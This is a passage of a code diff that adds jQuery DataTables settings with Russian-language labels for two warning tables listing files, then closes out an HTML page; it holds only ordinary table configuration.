+                "sUrl":          "",
+                "oPaginate": {
+                    "sFirst": "Первая",
+                    "sPrevious": "Предыдущая",
+                    "sNext": "Следующая",
+                    "sLast": "Последняя"
+                },
+                "oAria": {
+                    "sSortAscending":  ": активировать для сортировки столбца по возрастанию",
+                    "sSortDescending": ": активировать для сортировки столбцов по убыванию"
+                }
+            },
+
+        } );
+
+    });
+
+    if ($('#table_warn0')) {
+        $('#table_warn0').dataTable({
+            "aLengthMenu": [[100 , 500, -1], [100, 500, "All"]],
+            "paging": true,
+            "aoColumns": [
+                {"iDataSort": 7, "width":"70%"},
+                {"iDataSort": 5},
+                {"iDataSort": 6},
+                {"bSortable": true},
+                {"bVisible": false},
+                {"bVisible": false},
+                {"bVisible": false},
+                {"bVisible": false}
+            ],
+            "iDisplayLength": 500,
+            "oLanguage": {
+                "sLengthMenu": "Отображать по _MENU_ записей",
+                "sZeroRecords": "Ничего не найдено",
+                "sInfo": "Отображается c _START_ по _END_ из _TOTAL_ файлов",
+                "sInfoEmpty": "Нет файлов",
+                "sInfoFiltered": "(всего записей _MAX_)",
+                "sSearch":       "Поиск:",
+                "sUrl":          "",
+                "oPaginate": {
+                    "sFirst": "Первая",
+                    "sPrevious": "Предыдущая",
+                    "sNext": "Следующая",
+                    "sLast": "Последняя"
+                },
+                "oAria": {
+                    "sSortAscending":  ": активировать для сортировки столбца по возрастанию",
+                    "sSortDescending": ": активировать для сортировки столбцов по убыванию"
+                }
+            }
+
+        } );
+    }
+
+    if ($('#table_warn1')) {
+        $('#table_warn1').dataTable({
+            "aLengthMenu": [[100 , 500, -1], [100, 500, "All"]],
+            "paging": true,
+            "aoColumns": [
+                {"iDataSort": 7, "width":"70%"},
+                {"iDataSort": 5},
+                {"iDataSort": 6},
+                {"bSortable": true},
+                {"bVisible": false},
+                {"bVisible": false},
+                {"bVisible": false},
+                {"bVisible": false}
+            ],
+            "iDisplayLength": 500,
+            "oLanguage": {
+                "sLengthMenu": "Отображать по _MENU_ записей",
+                "sZeroRecords": "Ничего не найдено",
+                "sInfo": "Отображается c _START_ по _END_ из _TOTAL_ файлов",
+                "sInfoEmpty": "Нет файлов",
+                "sInfoFiltered": "(всего записей _MAX_)",
+                "sSearch":       "Поиск:",
+                "sUrl":          "",
+                "oPaginate": {
+                    "sFirst": "Первая",
+                    "sPrevious": "Предыдущая",
+                    "sNext": "Следующая",
+                    "sLast": "Последняя"
+                },
+                "oAria": {
+                    "sSortAscending":  ": активировать для сортировки столбца по возрастанию",
+                    "sSortDescending": ": активировать для сортировки столбцов по убыванию"
+                }
+            }
+
+        } );
+    }
+</script>
+<!-- [][]  -->
+</body>
+</html>
